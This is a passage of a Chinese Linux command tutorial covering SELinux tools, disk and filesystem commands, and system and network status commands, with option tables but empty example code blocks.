<td style="text-align:left">管理 linux 用户和 SELinux 之间的登录映射受限用户</td>
</tr>
<tr>
<td style="text-align:center"><code>user</code></td>
<td style="text-align:left">管理 SELinux 受限用户（角色和级别 SELinux 用户）</td>
</tr>
<tr>
<td style="text-align:center"><code>port</code></td>
<td style="text-align:left">管理网络端口类型定义</td>
</tr>
<tr>
<td style="text-align:center"><code>ibpkey</code></td>
<td style="text-align:left">管理 infiniband ibpkey 类型定义</td>
</tr>
<tr>
<td style="text-align:center"><code>ibendport</code></td>
<td style="text-align:left">管理 infiniband 端端口类型定义</td>
</tr>
<tr>
<td style="text-align:center"><code>interface</code></td>
<td style="text-align:left">管理网络接口类型定义</td>
</tr>
<tr>
<td style="text-align:center"><code>module</code></td>
<td style="text-align:left">管理 SELinux 策略模块</td>
</tr>
<tr>
<td style="text-align:center"><code>node</code></td>
<td style="text-align:left">节点管理网络节点类型定义</td>
</tr>
<tr>
<td style="text-align:center"><code>fcontext</code></td>
<td style="text-align:left">管理文件上下文映射定义</td>
</tr>
<tr>
<td style="text-align:center"><code>boolean</code></td>
<td style="text-align:left">管理布尔值以选择性地启用功能</td>
</tr>
<tr>
<td style="text-align:center"><code>permissive</code></td>
<td style="text-align:left">管理进程类型强制模式</td>
</tr>
<tr>
<td style="text-align:center"><code>dontaudit</code></td>
<td style="text-align:left">在策略中禁用/启用 dontauedit 规则</td>
</tr>
</tbody>
</table>
<blockquote>
<p>可以使用 <code>semanage [位置参数] -h</code> 查看</p>
</blockquote>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">查询</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">添加</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">修改</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">删除</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">SELinux 的对象类型</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> restorecon</h3>
<p><code>restorecon</code> 用于将设置好的 SELinux 安全上下文立即生效。语法格式：<code>restorecon [选项] 文件名</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">递归</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示修改过程</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> getsebool</h3>
<p><code>getsebool</code> 用于查询 SELinux 安全策略的布尔值。语法格式：<code>getsebool [选项] [布尔值条款] </code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>getsebool 显示所有 SELinux 布尔值，其中 <code>off</code> 为禁止状态，<code>on</code> 为允许状态</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有 SELinux 布尔值</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">将修改后的 SELinux 策略永久生效且立即生效</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h2> 查看磁盘信息</h2>
<h3> mount</h3>
<p><code>mount</code> 用于挂载文件系统。语法格式：<code>mount [选项] 文件系统 挂载目录</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">自动挂载所有在 <code>/etc/fstab</code> 中定义的文件系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">不规范化路径</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">显示文件系统标签</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">不要写入 <code>/etc/mtab</code></td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">以只读方式装载文件系统（与 <code>-oro</code> 相同）</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">指定文件系统类型</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code></td>
<td style="text-align:left">挂载文件系统读写（默认）</td>
</tr>
<tr>
<td style="text-align:center"><code>-o&lt;选项&gt;</code></td>
<td style="text-align:left">指定加载文件系统选项</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p><code>-o</code> 选项如下：</p>
<ul>
<li><strong>async</strong>：以非同步的方式执行文件系统的输入、输出动作</li>
<li><strong>atime</strong>：每次存取都更新 <code>inode</code> 的存取时间，默认设置，取消选项为 <code>noatime</code></li>
<li><strong>auto</strong>：必须在 <code>/etc/fstab</code> 文件中指定此选项。指定 <code>-a</code> 选项时，会加载设置为 <code>auto</code> 的设备，取消选项为 <code>noauto</code></li>
<li><strong>dev</strong>：可读文件系统上的字符或块设备，取消选项为 <code>nodev</code></li>
<li><strong>exec</strong>：可执行二进制文件，取消选项为 <code>noexec</code></li>
<li><strong>noatime</strong>：每次存取时不更新 <code>inode</code> 的存取时间</li>
<li><strong>noauto</strong>：加入此选项，就无法使用 <code>-a</code> 选项来加载</li>
<li><strong>nodev</strong>：不读文件系统上的字符或块设备</li>
<li><strong>noexec</strong>：无法执行二进制文件</li>
<li><strong>nosuid</strong>：关闭 <code>set-user-identifier</code>（设置用户 ID）与 <code>set-group-identifer</code>（设置组 ID）设置位</li>
<li><strong>nouser</strong>：使用户无法执行加载操作，默认设置</li>
<li><strong>iocharset=XXX</strong>：指定 mount 分区时使用的字符集</li>
<li><strong>codepage=XXX</strong>：指定 mount 分区时使用的内码表</li>
<li><strong>remount</strong>：重新加载设备。通常用于改变设备的设置状态</li>
<li><strong>ro</strong>：以只读模式加载</li>
<li><strong>rw</strong>：以可读写模式加载</li>
<li><strong>suid</strong>：启动 <code>set-user-identifier</code>（设置用户 ID）与 <code>set-group-identifer</code>（设置组 ID）设置位，取消选项为 <code>nosuid</code></li>
<li><strong>sync</strong>：以同步方式执行文件系统的输入、输出动作</li>
<li><strong>user</strong>：可以让一般用户加载设备</li>
<li><strong>defaults</strong>：使用默认选项。默认选项为 <code>rw</code>、<code>suid</code>、<code>dev</code>、<code>exec</code>、<code>anto</code>、<code>nouser</code> 与 <code>async</code>）</li>
</ul>
<p><code>-t&lt;文件系统类型&gt;</code> 指定设备的文件系统类型，常用选项如下：</p>
<ul>
<li><strong>ext3/ext2</strong>：Linux 目前的常用文件系统</li>
<li><strong>msdos</strong>：MS-DOS 的 FAT</li>
<li><strong>vfat</strong>：Windows 95/98 的 VFAT</li>
<li><strong>nfs</strong>：网络文件系统</li>
<li><strong>iso9660</strong>：CD-ROM 光盘的标准文件系统</li>
<li><strong>ntfs</strong>：Windows NT 的文件系统</li>
</ul>
<h3> umount</h3>
<p><code>umount</code> 用于卸载设备或文件系统。语法格式：<code>umount [设备文件/挂载目录]</code></p>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>如果当前就处在设备所挂载的目录时，系统会提升该设备繁忙，只需退出到其他目录在使用 umount 命令即可</p>
</div>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> blkid</h3>
<p><code>blkid</code> 用于显示设备的属性信息。语法格式：<code>blkid [设备名]</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> df</h3>
<p><code>df</code> 用于查看已挂载的磁盘空间使用情况。语法格式：<code>df [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">查看所有文件系统，包括伪、重复、不可访问的文件系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">人类可读的显示大小，1024 次方（例如：1023M）</td>
</tr>
<tr>
<td style="text-align:center"><code>-H</code></td>
<td style="text-align:left">显示大小为 1000 次方（例如：1.1G）</td>
</tr>
<tr>
<td style="text-align:center"><code>-i</code></td>
<td style="text-align:left">列出索引节点信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">本地文件系统列表</td>
</tr>
<tr>
<td style="text-align:center"><code>-T</code></td>
<td style="text-align:left">显示文件系统类型</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> fdisk</h3>
<p><code>fdisk</code> 用于新建、修改及删除磁盘的分区表信息。语法格式：<code>fdisk 磁盘名称</code></p>
<p>fdisk 命令中的选项作用：</p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>m</code></td>
<td style="text-align:left">查看全部可用的选项</td>
</tr>
<tr>
<td style="text-align:center"><code>n</code></td>
<td style="text-align:left">添加新的分区</td>
</tr>
<tr>
<td style="text-align:center"><code>d</code></td>
<td style="text-align:left">删除某个分区信息</td>
</tr>
<tr>
<td style="text-align:center"><code>l</code></td>
<td style="text-align:left">列出所有可用的分区类型</td>
</tr>
<tr>
<td style="text-align:center"><code>t</code></td>
<td style="text-align:left">改变某个分区的类型</td>
</tr>
<tr>
<td style="text-align:center"><code>p</code></td>
<td style="text-align:left">查看分区表信息</td>
</tr>
<tr>
<td style="text-align:center"><code>w</code></td>
<td style="text-align:left">保存并退出</td>
</tr>
<tr>
<td style="text-align:center"><code>q</code></td>
<td style="text-align:left">不保存直接退出</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> mkfs</h3>
<p><code>mkfs</code> 用于格式化文件系统。语法格式：<code>mkfs.文件类型 磁盘名称</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> du</h3>
<p><code>du</code> 用于查看分区或目录所占用的磁盘容量大小。语法格式：<code>du [选项] 目录名称</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示目录中所有文件的大小</td>
</tr>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">显示目录或文件大小时，以 byte 为单位</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">除了显示个别目录或文件的大小外，同时也显示所有目录或文件的总和</td>
</tr>
<tr>
<td style="text-align:center"><code>-D</code></td>
<td style="text-align:left">显示指定符号连接的源文件大小</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">以 <code>K</code>、<code>M</code>、<code>G</code> 为单位，提高信息的可读性</td>
</tr>
<tr>
<td style="text-align:center"><code>-H</code></td>
<td style="text-align:left">与 <code>-h</code> 选项相同，但是 <code>K</code>、<code>M</code>、<code>G</code> 是以 <code>1000</code> 为换算单位</td>
</tr>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">以 1024 bytes 为单位</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">重复计算硬件连接的文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">以 <code>1MB</code> 为单位</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">仅显示总计</td>
</tr>
<tr>
<td style="text-align:center"><code>--max-depth</code></td>
<td style="text-align:left">限制 du 应该遍历多少层子目录</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> fsck</h3>
<p><code>fsck</code> 用于检查文件系统并尝试修复错误。语法格式：<code>fsck [选项] [-t &lt;文件系统类型&gt;] [设备名]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-A</code></td>
<td style="text-align:left">检查所有文件系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-C[&lt;fd&gt;]</code></td>
<td style="text-align:left">显示进度条；文件描述符用于 GUI</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">锁定设备以保证独占访问</td>
</tr>
<tr>
<td style="text-align:center"><code>-M</code></td>
<td style="text-align:left">不检查已装载的文件系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-N</code></td>
<td style="text-align:left">不执行，只显示将要执行的操作</td>
</tr>
<tr>
<td style="text-align:center"><code>-P</code></td>
<td style="text-align:left">并行检查文件系统，包括根</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">跳过根文件系统；仅与 <code>-A</code> 一起使用</td>
</tr>
<tr>
<td style="text-align:center"><code>-r[&lt;fd&gt;]</code></td>
<td style="text-align:left">报告检查的每个设备的统计信息；文件描述符用于 GUI</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">序列化检查操作</td>
</tr>
<tr>
<td style="text-align:center"><code>-T</code></td>
<td style="text-align:left">启动时不显示标题</td>
</tr>
<tr>
<td style="text-align:center"><code>-t&lt;type&gt;</code></td>
<td style="text-align:left">指定要检查的文件系统类型；<code>&lt;type&gt;</code> 允许是逗号分隔的列表</td>
</tr>
<tr>
<td style="text-align:center"><code>-V</code></td>
<td style="text-align:left">显示过程</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h3> sync</h3>
<p><code>sync</code> 用于强制将内存缓冲区中的数据立即写入磁盘。语法格式：<code>sync [选项] [文件]</code></p>
<div class="hint-container note">
<p class="hint-container-title">注</p>
<p>用户通常无需执行 <code>sync</code> 命令，系统会自动执行 <code>update</code> 或 <code>bdflush</code> 操作，将缓冲区的数据写入磁盘</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">只同步文件数据，没有不需要的元数据</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">同步包含文件的文件系统</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2> 状态检测命令</h2>
<h3> ifconfig</h3>
<p><code>ifconfig</code> 用于获取网卡配置与网络状态等信息。语法格式：<code>ifconfig [选项] [网络设备]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有接口信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">显示简要信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有接口信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有接口信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>启动或关闭指定网卡：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><code>promisc</code> 设置是否支持网卡的 <code>promiscuous</code> 模式，选择此选项，网卡将接收网络中发给它所有的数据包</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p><code>allmulti</code> 设置是否支持多播模式，选择此选项，网卡将接受网络中所有的多播数据包</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>配置 IP 地址：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>单网卡添加多个 IP 地址：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><p>删除 IP 地址：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><p>启动或关闭 ARP 协议：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> nslookup</h3>
<p><code>nslookup</code> 用于域名与 IP 地址的解析记录。语法格式：<code>nslookup [域名 | IP]</code></p>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div></div></div><h3> nmcli</h3>
<p><code>nmcli</code> 网络管理，查看设备信息，并进行配置。语法格式：<code>nmcli [选项] 对象 { COMMAND | help }</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">询问缺少的选项</td>
</tr>
<tr>
<td style="text-align:center"><code>-c</code></td>
<td style="text-align:left">是否在输出中使用颜色</td>
</tr>
<tr>
<td style="text-align:center"><code>-e</code></td>
<td style="text-align:left">值中的转义列分隔符</td>
</tr>
<tr>
<td style="text-align:center"><code>-f</code></td>
<td style="text-align:left">指定要输出的字段</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">打印此帮助</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">输出模式</td>
</tr>
<tr>
<td style="text-align:center"><code>-o</code></td>
<td style="text-align:left">概览模式</td>
</tr>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">漂亮输出</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">允许显示密码</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">简洁输出</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示程序版本</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code></td>
<td style="text-align:left">设置等待完成操作的超时</td>
</tr>
</tbody>
</table>
<div class="hint-container tip">
<p class="hint-container-title">提示</p>
<p>可以只写对象的前几个字母，或只写对象的第一个字母</p>
</div>
<table>
<thead>
<tr>
<th style="text-align:center">对象</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>general</code></td>
<td style="text-align:left">NetworkManager 的常规状态和操作</td>
</tr>
<tr>
<td style="text-align:center"><code>networking</code></td>
<td style="text-align:left">整体联网控制</td>
</tr>
<tr>
<td style="text-align:center"><code>radio</code></td>
<td style="text-align:left">NetworkManager radio 开关</td>
</tr>
<tr>
<td style="text-align:center"><code>connection</code></td>
<td style="text-align:left">NetworkManager 的连接</td>
</tr>
<tr>
<td style="text-align:center"><code>device</code></td>
<td style="text-align:left">由 NetworkManager 管理的设备</td>
</tr>
<tr>
<td style="text-align:center"><code>agent</code></td>
<td style="text-align:left">NetworkManager secret agent or polkit agent</td>
</tr>
<tr>
<td style="text-align:center"><code>monitor</code></td>
<td style="text-align:left">监视 NetworkManager 更改</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> route</h3>
<p><code>route</code> 用于查看网络信息，操作和显示 IP 路由表。语法格式：<code>route [选项] [-A family |-4|-6]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">不解析名字</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示详细的处理信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-F</code></td>
<td style="text-align:left">显示转发信息库（默认）</td>
</tr>
<tr>
<td style="text-align:center"><code>-C</code></td>
<td style="text-align:left">显示路由缓存</td>
</tr>
<tr>
<td style="text-align:center"><code>del</code></td>
<td style="text-align:left">删除路由</td>
</tr>
<tr>
<td style="text-align:center"><code>add</code></td>
<td style="text-align:left">添加新的路由</td>
</tr>
<tr>
<td style="text-align:center"><code>-net</code></td>
<td style="text-align:left">目标地址是一个网络</td>
</tr>
<tr>
<td style="text-align:center"><code>-host</code></td>
<td style="text-align:left">目标地址是一个主机</td>
</tr>
<tr>
<td style="text-align:center"><code>netmask</code></td>
<td style="text-align:left">添加网络路由时，要使用的网络掩码</td>
</tr>
<tr>
<td style="text-align:center"><code>gw</code></td>
<td style="text-align:left">通过网关路由数据包</td>
</tr>
<tr>
<td style="text-align:center"><code>metric</code></td>
<td style="text-align:left">设置路由跳数</td>
</tr>
</tbody>
</table>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uname</h3>
<p>uname 用于查看系统内核版本与系统架构等信息。语法格式：<code>uname [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示全部的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">显示电脑类型</td>
</tr>
<tr>
<td style="text-align:center"><code>-n</code></td>
<td style="text-align:left">显示在网络上的主机名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-r</code></td>
<td style="text-align:left">显示操作系统的发行编号</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">显示操作系统名称</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> uptime</h3>
<p><code>uptime</code> 用于查看系统的负载信息。语法格式：<code>uptime [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-p</code></td>
<td style="text-align:left">采用可读友好的格式输出系统已运行时长</td>
</tr>
<tr>
<td style="text-align:center"><code>-s</code></td>
<td style="text-align:left">以格式 <code>2022-09-23 17:13:50</code> 输出系统</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">显示帮助信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-v</code></td>
<td style="text-align:left">显示版本信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>13:31:26</strong>：显示当前系统时间</li>
<li><strong>up 2 days, 20:17</strong>：系统已运行时间</li>
<li><strong>1 user</strong>：启用终端数量</li>
<li><strong>load average: 0.00, 0.00, 0.00</strong>：平均负载值（三个值分别为 1 分钟、5 分钟、15 分钟内的平均值，数值越小负载越低）</li>
</ul>
<h3> free</h3>
<p><code>free</code> 用于显示当前系统中内存的使用量。语法格式：<code>free [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-b</code></td>
<td style="text-align:left">以 bytes 为单位来显示内存的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-k</code></td>
<td style="text-align:left">以 kb 为单位来显示内存的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">以 m 为单位来显示内存的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">以 G 为单位来显示内存的信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-h</code></td>
<td style="text-align:left">以适于人类可读方式显示内存信息。-h 与其他命令最大不同是 -h 选项会在数字后面加上适于人类可读的单位</td>
</tr>
<tr>
<td style="text-align:center"><code>-l</code></td>
<td style="text-align:left">显示高低内存的利用率</td>
</tr>
<tr>
<td style="text-align:center"><code>-t</code></td>
<td style="text-align:left">显示 linux 的全部内存</td>
</tr>
<tr>
<td style="text-align:center"><code>-s N</code></td>
<td style="text-align:left">表示每隔 N 秒打印一次内存信息，直到用 <code>ctrl + c</code> 结束</td>
</tr>
<tr>
<td style="text-align:center"><code>-c N</code></td>
<td style="text-align:left">表示重复打印内存信息 N 次</td>
</tr>
<tr>
<td style="text-align:center"><code>-w</code></td>
<td style="text-align:left">输出样式为宽输出</td>
</tr>
<tr>
<td style="text-align:center"><code>-V</code></td>
<td style="text-align:left">显示版本信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><ul>
<li><strong>total</strong>：总计内存的大小</li>
<li><strong>used</strong>：已使用内存的大小</li>
<li><strong>free</strong>：空闲内存的大小</li>
<li><strong>shared</strong>：多个进程共享的内存总额</li>
<li><strong>buff/cache</strong>：磁盘的缓存大小</li>
<li><strong>available</strong>：可以被新应用程序使用的内存大小</li>
</ul>
<h3> who</h3>
<p><code>who</code> 用于查看当前登入主机的用户终端信息。语法格式：<code>who [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">显示所有用户的所有信息</td>
</tr>
<tr>
<td style="text-align:center"><code>-m</code></td>
<td style="text-align:left">显示运行该程序的用户名，和 <code>who am I</code> 的作用一样</td>
</tr>
<tr>
<td style="text-align:center"><code>-q</code></td>
<td style="text-align:left">只显示用户的登陆帐号和登陆用户的数量，该选项优先级高于其他任何选项</td>
</tr>
<tr>
<td style="text-align:center"><code>-u</code></td>
<td style="text-align:left">在登陆用户后面显示该用户最后一次对系统进行操作距今的时间</td>
</tr>
<tr>
<td style="text-align:center"><code>-H</code></td>
<td style="text-align:left">显示列标题</td>
</tr>
</tbody>
</table>
<p>example：</p>
<div class="language-bash line-numbers-mode" data-ext="sh"><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><h3> last</h3>
<p><code>last</code> 用于调取主机的被访记录。语法格式：<code>last [选项]</code></p>
<table>
<thead>
<tr>
<th style="text-align:center">选项</th>
<th style="text-align:left">作用</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:center"><code>-a</code></td>
<td style="text-align:left">把从何处登入系统的主机名称或 IP 地址，显示在最后一行</td>
</tr>
<tr>
<td style="text-align:center"><code>-d</code></td>
<td style="text-align:left">将 IP 地址转换成主机名称</td>
</tr>
<tr>
<td style="text-align:center"><code>-f &lt;记录文件&gt;</code></td>
<td style="text-align:left">指定记录文件</td>
</tr>
<tr>
<td style="text-align:center"><code>-n &lt;显示列数&gt;</code> 或 <code>-&lt;显示列数&gt;</code></td>
<td style="text-align:left">设置列出名单的显示列数</td>
</tr>
<tr>
<td style="text-align:center"><code>-R</code></td>
<td style="text-align:left">不显示登入系统的主机名称或 IP 地址</td>
</tr>
<tr>
<td style="text-align:center"><code>-x</code></td>
<td style="text-align:left">显示系统关机，重新开机，以及执行等级的改变等信息</td>
</tr>
</tbody>
</table>
<p>example：</p>
